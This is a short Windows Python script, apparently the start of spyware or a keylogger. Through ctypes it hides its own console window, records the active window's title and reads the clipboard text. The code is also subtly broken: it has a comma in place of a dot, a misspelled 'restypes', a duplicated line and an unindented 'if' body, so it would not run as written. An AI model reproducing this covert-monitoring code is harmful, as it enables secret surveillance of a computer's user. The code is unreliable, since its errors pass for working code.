from ctypes import *
import ctypes
import logging

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

user32.ShowWindow(kernel32,GetConsoleWindow(), 0)

def get_current_window():
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLength
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()
    length = GetWindowTextLength(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)

    GetWindowText(hwnd, buff, length + 1)
    return buff.value

def get_clipboard():
    
    CF_TEXT = 1
    
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restypes = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]

    user32.GetClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    user32.OpenClipboard(0)

    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT):
        data = GetClipboardData(CF_TEXT)
        data_locked = kernel32.GlobalLock(data)
        text = ctypes.c_char_p(data_locked)
        value = text.value
        kernel32.GlobalUnlock(data_locked)
        return value.decode('utf-8')
    finally:
        CloseClipboard()
